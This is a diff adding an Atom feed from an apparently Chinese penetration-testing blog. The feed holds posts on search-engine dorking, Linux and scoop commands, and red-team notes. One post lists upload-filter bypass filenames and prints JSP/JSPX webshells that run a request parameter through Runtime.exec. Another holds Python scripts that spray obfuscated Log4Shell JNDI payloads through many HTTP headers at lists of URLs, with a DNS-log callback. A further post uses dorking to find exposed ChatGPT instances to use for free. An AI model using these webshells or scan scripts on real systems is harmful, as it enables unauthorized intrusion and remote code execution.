@@ -1,0 +1,484 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>这里有一个网站</title>
+  
+  <subtitle>一个不怎么安全的网站</subtitle>
+  <link href="https://blog.njcit.me/atom.xml" rel="self"/>
+  
+  <link href="https://blog.njcit.me/"/>
+  <updated>2023-04-17T02:52:35.314Z</updated>
+  <id>https://blog.njcit.me/</id>
+  
+  <author>
+    <name>ccadmin</name>
+    
+  </author>
+  
+  <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>quake使用笔记</title>
+    <link href="https://blog.njcit.me/2023/04/17/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E6%90%9C%E7%B4%A2/quake%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/"/>
+    <id>https://blog.njcit.me/2023/04/17/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E6%90%9C%E7%B4%A2/quake%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/</id>
+    <published>2023-04-17T02:27:01.000Z</published>
+    <updated>2023-04-17T02:52:35.314Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>国内搜索引擎越来越多，fofa,hunter，zoomeye，当然也包括quake，当初是看重他的漏洞库才开的会员，奈何不向普通会员开放，那要你有啥用，不过买都买了，不如就了解如何去正常如使用他。</p><h1 id="搜索语法"><a href="#搜索语法" class="headerlink" title="搜索语法"></a>搜索语法</h1><p>官方的文档：<a href="https://quake.360.net/quake/#/help?id=5eb238f110d2e850d5c6aec8&amp;title=%E6%A3%80%E7%B4%A2%E5%85%B3%E9%94%AE%E8%AF%8D">https://quake.360.net/quake/#/help?id=5eb238f110d2e850d5c6aec8&amp;title=%E6%A3%80%E7%B4%A2%E5%85%B3%E9%94%AE%E8%AF%8D</a>  </p><p>先放一些官方文档可能没有的检索字段：  </p><ul><li><p>is_domain:”true” 查询有域名的资产</p></li><li><p>type: “蜜罐(honeypot)” 查询quake判断是蜜罐的资产</p></li></ul><h1 id="其他语法示例"><a href="#其他语法示例" class="headerlink" title="其他语法示例"></a>其他语法示例</h1><ul><li><code>response:&quot;&lt;title&gt;系统&lt;/title&gt;&quot;</code>: 全匹配title</li><li><code>app:&quot;扫描黑洞&quot;</code>: 目标IP开放端口大于一个阈值，就会被标注为扫描黑洞</li></ul><h2 id="查询一些存在漏洞的语法"><a href="#查询一些存在漏洞的语法" class="headerlink" title="查询一些存在漏洞的语法"></a>查询一些存在漏洞的语法</h2><ul><li>title:”Index of &#x2F;“，这个语法会匹配到index,而且没办法使用not进行排除，建议使用全匹配。</li></ul><p><img src="/../../source/images/quake%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/image-20230417104830535.png" alt="image-20230417104830535"></p><ul><li><code>response:&quot;&amp;lt;dir&amp;gt;&quot;</code></li></ul><p><img src="/../../source/images/quake%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/image-20230417105206092.png" alt="image-20230417105206092"></p><h1 id="quake特色"><a href="#quake特色" class="headerlink" title="quake特色"></a>quake特色</h1><p>不开启排除蜜罐，蜜罐永远靠前，绝绝子</p><p><img src="/../../source/images/quake%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/image-20230417104609245.png" alt="image-20230417104609245"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;国内搜索引擎越来越多，fofa,hunter，zoomeye，当然也包括quake，当初是看重他的漏洞库才开的会员，奈何不向普通会员开放，那</summary>
+      
+    
+    
+    
+    
+    <category term="quake" scheme="https://blog.njcit.me/tags/quake/"/>
+    
+    <category term="网络空间搜索引擎" scheme="https://blog.njcit.me/tags/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>文件上传绕过waf姿势收集</title>
+    <link href="https://blog.njcit.me/2023/03/23/waf_bypass/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
+    <id>https://blog.njcit.me/2023/03/23/waf_bypass/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</id>
+    <published>2023-03-23T01:27:44.000Z</published>
+    <updated>2023-03-23T02:48:49.365Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>现在渗透测试基本都会遇到waf，有waf就会封ip，有waf就要fuzz,记录一下从网上收集到的常用的文件上传的姿势，不一定能用，说不定下次就遇到了呢。</p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="后缀绕过"><a href="#后缀绕过" class="headerlink" title="后缀绕过"></a>后缀绕过</h2><p>白名单基本没戏，洗洗睡吧。记录一下遇到的黑名单绕过。</p><h3 id="jsp"><a href="#jsp" class="headerlink" title="jsp"></a>jsp</h3><ul><li>1.jpg\.jsp&#x2F;<br>以下内容可以尝试换行试一下</li><li>filename&#x3D;’shell.jspx.jsp’</li><li>filename&#x3D;shell.jspx.jsp</li><li>filename&#x3D;shell.jspx.jsp’</li><li>“filename”&#x3D;shell.jspx;</li><li>filename&#x3D;shell.jpg;filename&#x3D;shell.jspx;</li><li>filename&#x3D;shell.jspx;filename&#x3D;shell.jpg;</li><li>FileName&#x3D;shell.jspx.jsp’</li><li>FileName&#x3D;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaashell.jspx.jsp’</li><li>FileName &#x3D;shell.jspx（加空格）</li><li>filename&#x3D;&#x3D;&#x3D;&#x3D;”shell.jspx.jsp1”（加等号）</li><li>FileName &#x3D;shell.jspx</li><li>FileName&#x3D;shell.jspx.<br>jsp</li><li>File<br>Name&#x3D;shell.jspx.jsp’</li></ul><h2 id="内容绕过"><a href="#内容绕过" class="headerlink" title="内容绕过"></a>内容绕过</h2><p>jsp利用EL表达式绕过</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;x&quot;</span>))&#125;</span><br></pre></td></tr></table></figure><p>jspx利用命名空间绕过:<a href="http://127.0.0.1:8080/test.jsp?ccadmin=whoami,%E5%85%B6%E4%B8%ADbbb%E5%8F%AF%E4%BB%A5%E4%BB%BB%E6%84%8F%E6%9B%BF%E6%8D%A2">http://127.0.0.1:8080/test.jsp?ccadmin=whoami,其中bbb可以任意替换</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;bbb:root xmlns:bbb=&quot;http://java.sun.com/JSP/Page&quot; version=&quot;1.2&quot;&gt;</span><br><span class="line">    &lt;bbb:scriptlet&gt;</span><br><span class="line">    Runtime.getRuntime().exec(request.getParameter(&quot;ccadmin&quot;));    </span><br><span class="line">&lt;/bbb:scriptlet&gt;&gt;</span><br><span class="line">&lt;/bbb:root&gt;</span><br></pre></td></tr></table></figure><p>jspx利用jsp:expression绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;bbb:root xmlns:bbb=&quot;http://java.sun.com/JSP/Page&quot; version=&quot;1.2&quot;&gt;</span><br><span class="line">    &lt;bbb:expression&gt;</span><br><span class="line">    Runtime.getRuntime().exec(request.getParameter(&quot;ccadmin&quot;))</span><br><span class="line">&lt;/bbb:expression&gt;</span><br><span class="line">&lt;/bbb:root&gt;</span><br></pre></td></tr></table></figure><h1 id="参考内容"><a href="#参考内容" class="headerlink" title="参考内容"></a>参考内容</h1><ul><li><a href="https://xz.aliyun.com/t/10515">https://xz.aliyun.com/t/10515</a></li><li><a href="https://yzddmr6.com/posts/jsp-webshell-upload-bypass/">https://yzddmr6.com/posts/jsp-webshell-upload-bypass/</a></li></ul>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;现在渗透测试基本都会遇到waf，有waf就会封ip，有waf就要fuzz,记录一下从网上收集到的常用的文件上传的姿势，不一定能用，说不定下次</summary>
+      
+    
+    
+    
+    
+    <category term="waf" scheme="https://blog.njcit.me/tags/waf/"/>
+    
+    <category term="bypass" scheme="https://blog.njcit.me/tags/bypass/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>AI相关</title>
+    <link href="https://blog.njcit.me/2023/03/22/%E6%9D%82%E9%A1%B9/AI%E7%9B%B8%E5%85%B3/"/>
+    <id>https://blog.njcit.me/2023/03/22/%E6%9D%82%E9%A1%B9/AI%E7%9B%B8%E5%85%B3/</id>
+    <published>2023-03-22T08:27:44.000Z</published>
+    <updated>2023-03-22T09:01:29.686Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h1><ul><li><p><a href="https://chat.openai.com/chat">https://chat.openai.com/chat</a></p><p>貌似是通过udp判断IP，建议使用美国的IP</p><p><img src="/../../source/images/AI%E7%9B%B8%E5%85%B3/image-20230322163014374.png" alt="image-20230322163014374"></p></li><li><p><a href="https://www.bing.com/new">https://www.bing.com/new</a><br>国内要使用插件修改header,貌似dev不用<br><img src="/../../source/images/AI%E7%9B%B8%E5%85%B3/image-20230322170113101.png" alt="image-20230322170113101"></p></li><li><p><a href="https://bard.google.com/">https://bard.google.com/</a></p></li><li><p><a href="https://yiyan.baidu.com/welcome">https://yiyan.baidu.com/welcome</a></p><h1 id="白嫖"><a href="#白嫖" class="headerlink" title="白嫖"></a>白嫖</h1><p>quake语法：title: “ChatGPT Web”</p><p><a href="https://quake.360.net/quake/#/searchResult?searchVal=title%3A%22chatgpt%22%20AND%20title%3A%20%22ChatGPT%20Web%22&amp;selectIndex=quake_service&amp;ignore_cache=false&amp;timeRange=&amp;timeRange=&amp;latest=true&amp;t=1679475514161">https://quake.360.net/quake/#/searchResult?searchVal=title%3A%22chatgpt%22%20AND%20title%3A%20%22ChatGPT%20Web%22&amp;selectIndex=quake_service&amp;ignore_cache=false&amp;timeRange=&amp;timeRange=&amp;latest=true&amp;t=1679475514161</a></p><p><img src="/../../source/images/AI%E7%9B%B8%E5%85%B3/image-20230322165916603.png" alt="image-20230322165916603"></p></li></ul>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;链接&quot;&gt;&lt;a href=&quot;#链接&quot; class=&quot;headerlink&quot; title=&quot;链接&quot;&gt;&lt;/a&gt;链接&lt;/h1&gt;&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;&lt;a href=&quot;https://chat.openai.com/chat&quot;&gt;https://chat.openai.co</summary>
+      
+    
+    
+    
+    
+    <category term="AI" scheme="https://blog.njcit.me/tags/AI/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>反序列化学习资料</title>
+    <link href="https://blog.njcit.me/2023/03/22/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/"/>
+    <id>https://blog.njcit.me/2023/03/22/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/</id>
+    <published>2023-03-22T01:07:17.000Z</published>
+    <updated>2023-03-22T08:19:20.963Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="资料链接"><a href="#资料链接" class="headerlink" title="资料链接"></a>资料链接</h1><ul><li>Java安全漫谈：<a href="https://github.com/phith0n/JavaThings">https://github.com/phith0n/JavaThings</a></li><li>Java反序列化漏洞学习 Commons Collection：<a href="https://tttang.com/archive/1337/">https://tttang.com/archive/1337/</a></li><li>反序列化分析到shiro注入WebSocket内存马：<a href="https://xz.aliyun.com/t/12042">https://xz.aliyun.com/t/12042</a></li><li>TemplatesImpl利用链与Fastjson注入内存马：<a href="https://xz.aliyun.com/t/12085">https://xz.aliyun.com/t/12085</a></li><li>从0到1的fastjson的反序列化漏洞分析：<a href="https://xz.aliyun.com/t/12096">https://xz.aliyun.com/t/12096</a></li></ul>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;资料链接&quot;&gt;&lt;a href=&quot;#资料链接&quot; class=&quot;headerlink&quot; title=&quot;资料链接&quot;&gt;&lt;/a&gt;资料链接&lt;/h1&gt;&lt;ul&gt;
+&lt;li&gt;Java安全漫谈：&lt;a href=&quot;https://github.com/phith0n/JavaThings&quot;</summary>
+      
+    
+    
+    
+    
+    <category term="代码审计" scheme="https://blog.njcit.me/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+    
+    <category term="反序列化" scheme="https://blog.njcit.me/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Linux基础命令</title>
+    <link href="https://blog.njcit.me/2023/02/21/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/"/>
+    <id>https://blog.njcit.me/2023/02/21/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/</id>
+    <published>2023-02-21T07:43:37.000Z</published>
+    <updated>2023-02-21T08:24:24.017Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>好多命令平时用的少，经常忘，在此做一次记录。</p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="Ubuntu修改主机名"><a href="#Ubuntu修改主机名" class="headerlink" title="Ubuntu修改主机名"></a>Ubuntu修改主机名</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo hostnamectl set-hostname ty</span><br></pre></td></tr></table></figure><h2 id="Ubuntu修改SSH欢迎信息"><a href="#Ubuntu修改SSH欢迎信息" class="headerlink" title="Ubuntu修改SSH欢迎信息"></a>Ubuntu修改SSH欢迎信息</h2><p>修改&#x2F;etc&#x2F;update-motd.d&#x2F;目录下面的文件即可，不行就重启一下</p><h2 id="SSH密钥登录"><a href="#SSH密钥登录" class="headerlink" title="SSH密钥登录"></a>SSH密钥登录</h2><p>把公钥放在.ssh&#x2F;authorized_keys中即可</p><h2 id="scp"><a href="#scp" class="headerlink" title="scp"></a>scp</h2><p>指定端口：scp -P 2233 get_info.sh <a href="mailto:&#x6c;&#105;&#101;&#109;&#101;&#114;&#x40;&#49;&#57;&#50;&#46;&#x31;&#x36;&#56;&#46;&#x37;&#54;&#46;&#53;&#x32;">&#x6c;&#105;&#101;&#109;&#101;&#114;&#x40;&#49;&#57;&#50;&#46;&#x31;&#x36;&#56;&#46;&#x37;&#54;&#46;&#53;&#x32;</a>:&#x2F;usr&#x2F;local&#x2F;src  </p><p>传输目录scp -r &#x2F;opt&#x2F;  <a href="mailto:&#108;&#105;&#101;&#x6d;&#101;&#114;&#x40;&#49;&#57;&#50;&#46;&#x31;&#x36;&#56;&#46;&#x37;&#54;&#x2e;&#53;&#x32;">&#108;&#105;&#101;&#x6d;&#101;&#114;&#x40;&#49;&#57;&#50;&#46;&#x31;&#x36;&#56;&#46;&#x37;&#54;&#x2e;&#53;&#x32;</a>:&#x2F;usr&#x2F;local&#x2F;src  </p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;好多命令平时用的少，经常忘，在此做一次记录。&lt;/p&gt;
+&lt;h1 id=&quot;正文&quot;&gt;&lt;a href=&quot;#正文&quot; class=&quot;headerlink</summary>
+      
+    
+    
+    
+    
+    <category term="Linux" scheme="https://blog.njcit.me/tags/Linux/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>scoop基础使用</title>
+    <link href="https://blog.njcit.me/2023/02/19/scoop%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/"/>
+    <id>https://blog.njcit.me/2023/02/19/scoop%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/</id>
+    <published>2023-02-19T10:06:47.000Z</published>
+    <updated>2023-02-19T10:28:18.582Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>scoop是一个包管理软件，可以通过一条命令安装&#x2F;更新卸载软件，scoop拥有大量软件，基本上常用的软件都在scoop里面能找到。</p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><h2 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h2><p>建议使用pwsh和Windows终端</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Set-ExecutionPolicy RemoteSigned -Scope CurrentUser</span><br><span class="line">irm get.scoop.sh | iex</span><br></pre></td></tr></table></figure><h2 id="配置额外的bucket"><a href="#配置额外的bucket" class="headerlink" title="配置额外的bucket"></a>配置额外的bucket</h2><p>查看bucket列表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">scoop bucket known</span><br><span class="line"></span><br><span class="line">main</span><br><span class="line">extras</span><br><span class="line">versions</span><br><span class="line">nirsoft</span><br><span class="line">sysinternals</span><br><span class="line">php</span><br><span class="line">nerd-fonts</span><br><span class="line">nonportable</span><br><span class="line">java</span><br><span class="line">games</span><br></pre></td></tr></table></figure><p>添加bucket(要先安装git)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scoop bucket add extras</span><br></pre></td></tr></table></figure><p>查看本地的bucket列表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scoop bucket list</span><br></pre></td></tr></table></figure><p>修改安装位置,注意：已经安装的软件可能出现问题，建议重新安装。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$env:SCOOP=&#x27;D:\Applications\Scoop&#x27;</span><br><span class="line">[Environment]::SetEnvironmentVariable(&#x27;SCOOP&#x27;, $env:SCOOP, &#x27;User&#x27;)</span><br><span class="line">$env:SCOOP_GLOBAL=&#x27;F:\GlobalScoopApps&#x27;</span><br><span class="line">[Environment]::SetEnvironmentVariable(&#x27;SCOOP_GLOBAL&#x27;, $env:SCOOP_GLOBAL, &#x27;Machine&#x27;)</span><br></pre></td></tr></table></figure><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li><a href="https://scoop.sh/">https://scoop.sh/</a></li></ul>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;scoop是一个包管理软件，可以通过一条命令安装&amp;#x2F;更新卸载软件，scoop拥有大量软件，基本上常用的软件都在scoop里面能找到。</summary>
+      
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>漏洞扫描</title>
+    <link href="https://blog.njcit.me/2023/02/17/%E5%8D%8E%E4%B8%BA%E8%A1%8C%E5%8A%A8/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/"/>
+    <id>https://blog.njcit.me/2023/02/17/%E5%8D%8E%E4%B8%BA%E8%A1%8C%E5%8A%A8/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/</id>
+    <published>2023-02-17T06:14:22.000Z</published>
+    <updated>2023-03-22T08:07:23.338Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一场比赛最重要的环节就是外网打点，外网没点进不了内网一切都白瞎，在我的印象中，这几年比较火的漏洞是shiro 550&#x2F;springboot rce&#x2F;log4j rce。第一时间肯定要先扫描提供的资产是不是存在上面的漏洞，快速打点。当然各大oa还财务系统也存在各种漏洞。</p><h1 id="批量漏洞扫描"><a href="#批量漏洞扫描" class="headerlink" title="批量漏洞扫描"></a>批量漏洞扫描</h1><h2 id="log4j"><a href="#log4j" class="headerlink" title="log4j"></a>log4j</h2><p>fuzz spring</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> api.read_file</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">urllib3.disable_warnings()</span><br><span class="line">q = <span class="string">b&#x27;icon_hash=&quot;116323821&quot; &amp;&amp; country=&quot;CN&quot;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># url_list = api.fofa_api.get_url(base64.b64encode(q), 4)</span></span><br><span class="line">url_list = api.read_file.get_url_list(<span class="string">&#x27;url.txt&#x27;</span>)</span><br><span class="line">hl = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> url <span class="keyword">in</span> url_list:</span><br><span class="line">    hl.update(url.encode(encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(url + <span class="string">&#x27;\t\t&#x27;</span> + hl.hexdigest())</span><br><span class="line">    dnslog = <span class="string">&#x27;dnslog&#x27;</span></span><br><span class="line">    accept = <span class="string">&#x27;$&#123;$&#123;::-j&#125;$&#123;::-n&#125;$&#123;::-d&#125;$&#123;::-i&#125;: $&#123;::-r&#125;$&#123;::-m&#125;$&#123;::-i&#125;:// &#x27;</span> + hl.hexdigest()[<span class="number">0</span>:<span class="number">5</span>] + dnslog + <span class="string">&#x27;/poc&#125;&#x27;</span></span><br><span class="line">    header = &#123;</span><br><span class="line">        <span class="string">&#x27;Accept&#x27;</span>: accept</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.get(url, headers=header, timeout=<span class="number">5</span>, verify=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;请求出现异常&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>fuzz 全部header</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> api.read_file</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line">url_list = api.read_file.get_url_list(<span class="string">&#x27;url.txt&#x27;</span>)</span><br><span class="line">hl = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> url <span class="keyword">in</span> url_list:</span><br><span class="line">    hl.update(url.encode(encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(url + <span class="string">&#x27;\t\t&#x27;</span> + hl.hexdigest())</span><br><span class="line">    dnslog = <span class="string">&#x27;dnslog&#x27;</span></span><br><span class="line">    poc = <span class="string">&#x27;$&#123;$&#123;::-j&#125;$&#123;::-n&#125;$&#123;::-d&#125;$&#123;::-i&#125;: $&#123;::-r&#125;$&#123;::-m&#125;$&#123;::-i&#125;:// &#x27;</span> + hl.hexdigest()[<span class="number">0</span>:<span class="number">5</span>] + dnslog + <span class="string">&#x27;/poc&#125;&#x27;</span></span><br><span class="line">    header = &#123;</span><br><span class="line">        <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;accept&#x27;</span> + <span class="string">&#x27;.&#x27;</span> + poc,</span><br><span class="line">        <span class="string">&#x27;X-Client-IP&#x27;</span>: <span class="string">&#x27;X-Client-IP&#x27;</span> + <span class="string">&#x27;.&#x27;</span> + poc,</span><br><span class="line">        <span class="string">&#x27;X-Remote-IP&#x27;</span>: <span class="string">&#x27;X-Remote-IP&#x27;</span> + <span class="string">&#x27;.&#x27;</span> + poc,</span><br><span class="line">        <span class="string">&#x27;X-Remote-Addr&#x27;</span>: <span class="string">&#x27;X-Remote-Addr&#x27;</span> + <span class="string">&#x27;.&#x27;</span> + poc,</span><br><span class="line">        <span class="string">&#x27;X-Forwarded-For&#x27;</span>: <span class="string">&#x27;X-Forwarded-For&#x27;</span> + <span class="string">&#x27;.&#x27;</span> + poc,</span><br><span class="line">        <span class="string">&#x27;X-Originating-IP&#x27;</span>: <span class="string">&#x27;X-Originating-IP&#x27;</span> + <span class="string">&#x27;.&#x27;</span> + poc,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;User-Agent&#x27;</span> + <span class="string">&#x27;.&#x27;</span> + poc,</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;Referer&#x27;</span> + <span class="string">&#x27;.&#x27;</span> + poc,</span><br><span class="line">        <span class="string">&#x27;Authorization&#x27;</span>: <span class="string">&#x27;Authorization&#x27;</span> + <span class="string">&#x27;.&#x27;</span> + poc</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.get(url, headers=header, timeout=<span class="number">5</span>, verify=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;请求出现异常&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="shiro"><a href="#shiro" class="headerlink" title="shiro"></a>shiro</h2><p>直接把所有流量走一遍burpsuite或者xray，效率最高。</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;一场比赛最重要的环节就是外网打点，外网没点进不了内网一切都白瞎，在我的印象中，这几年比较火的漏洞是shiro 550&amp;#x2F;spring</summary>
+      
+    
+    
+    
+    
+    <category term="hvv" scheme="https://blog.njcit.me/tags/hvv/"/>
+    
+    <category term="漏洞扫描" scheme="https://blog.njcit.me/tags/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>攻防演练学习笔记</title>
+    <link href="https://blog.njcit.me/2023/02/13/%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
+    <id>https://blog.njcit.me/2023/02/13/%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
+    <published>2023-02-13T14:05:05.000Z</published>
+    <updated>2023-02-17T03:36:53.997Z</updated>
+    
